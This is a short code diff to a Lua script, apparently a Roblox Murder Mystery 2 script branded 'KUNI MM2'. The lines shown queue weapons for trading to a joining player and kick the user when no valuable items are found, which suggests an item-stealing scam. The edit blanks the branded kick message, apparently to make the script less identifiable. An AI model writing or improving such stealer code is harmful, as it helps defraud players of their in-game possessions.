@@ -708,5 +708,5 @@ if #weaponQueue > 0 then
     Players.PlayerAdded:Connect(TryTradePlayer)
 else
     task.wait(1)
-    localPlayer:Kick("KUNI MM2 | No valuable items found.")
+    localPlayer:Kick("")
 end
